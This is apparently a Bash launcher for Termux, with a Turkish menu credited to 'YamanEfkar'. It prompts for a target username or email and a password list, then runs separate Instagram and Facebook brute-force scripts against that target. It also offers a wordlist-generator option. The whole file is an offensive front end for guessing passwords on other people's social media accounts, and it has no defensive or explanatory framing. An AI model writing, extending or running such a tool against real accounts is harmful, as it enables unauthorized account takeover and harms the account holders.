#!/data/data/com.termux/bin/bash
#!/bin/bash
clear


banner(){
	echo -e '\e[37m
	\tCode: YamanEfkar\033[31;40;1m
	¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.¸
	░
	░\e[31m[\e[37m01\e[31m]\e[37mİnstagram Bruteforce\033[31;40;1m
	░
	░\e[31m[\e[37m02\e[31m]\e[37mFacebook Bruteforce\033[31;40;1m
	░
	░
	░
	░\e[31m[\e[37m03\e[31m]\e[37mWordlist\033[31;40;1m
	░
	░¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.

	\e[33m[\e[37m\t  Bruteforce   \t\e[33m]

	\e[31m[\e[37m00\e[31m]\e[37mMenü\e[31m   [\e[37mMenu\e[31m]\e[37m
	\e[31m[\e[37m99\e[31m]\e[37mÇıkış\e[31m  [\e[37mExit\e[31m]\e[37m
	'

	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem_numarasi

}

banner

if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
	echo -e ""
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mHedef Kullanıcı Adı : ' username
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mŞifre Listesi : ' password
	cd instagram-bruteforce/ &&
	python3 instagram.py $username $password -m 3

elif [[ $islem_numarasi == 02 ||  $islem_numarasi == 2  ]]; then
	echo -e ""
	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37mEposta : ' eposta
	echo -e ""
	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37mŞifre Listesi : ' sifre
	python fb.py -u $eposta -p $sifre

elif [[ $islem_numarasi == 03 ||  $islem_numarasi == 3  ]]; then
	cd Wordlist-Pluas/ && bash tst.sh

elif [[ $islem_numarasi == 04 ||  $islem_numarasi == 4  ]]; then
	echo -e "İşlem 4"
elif [[ $islem_numarasi == 99 ||  $islem_numarasi == 9  ]]; then
	clear
	echo -e "\e[37mGüle güle..."
	sleep 2
	clear
	exit
elif [[ $islem_numarasi == 00 ||  $islem_numarasi == 0  ]]; then
	cd ../ && bash tst.sh
else
	bash tst.sh
fi
